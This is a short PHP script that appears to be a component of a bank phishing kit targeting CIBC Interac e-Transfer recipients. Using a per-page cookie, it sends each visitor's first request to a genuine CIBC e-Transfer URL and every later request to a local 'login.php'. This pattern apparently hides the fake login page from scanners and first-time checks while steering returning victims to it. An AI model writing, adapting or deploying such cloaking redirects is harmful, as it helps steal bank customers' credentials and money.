<?php
declare(strict_types=1);

session_start();

/* ---------------- GET UNIQUE PAGE KEY ---------------- */
$pageKey = $_GET['pageKey'] ?? 'default_key';
$pageKey = preg_replace('/[^A-Za-z0-9_]/', '', $pageKey);

/* ---------------- CONFIG ---------------- */
$first_visit_url = 'https://www.cibconline.cibc.com/ebm-resources/online-banking/client/index.html#/auth/emt-receive?emtId=CAJZWfjX';
$return_url      = 'login.php';
$expiry_seconds  = 86400 * 30; // 30 days

/* Cookie name now tied to pageKey */
$cookie_name = "etransfer_first_seen_" . $pageKey;

/* ---------------- VALIDATE EXTERNAL URL ---------------- */
if (empty($first_visit_url) || !filter_var($first_visit_url, FILTER_VALIDATE_URL)) {
    header("Location: $return_url", true, 302);
    exit;
}

/* ---------------- FIRST VISIT ---------------- */
if (!isset($_COOKIE[$cookie_name])) {
    // Set cookie unique to this page key
    $cookie_value = uniqid('', true);
    setcookie(
        $cookie_name,
        $cookie_value,
        time() + $expiry_seconds,
        '/',
        '',
        isset($_SERVER['HTTPS']),
        true
    );

    // Redirect to external site FIRST time only
    header("Location: $first_visit_url", true, 302);
    exit;
}

/* ---------------- SECOND VISIT → GO TO LOGIN.PHP ---------------- */
header("Location: $return_url", true, 302);
exit;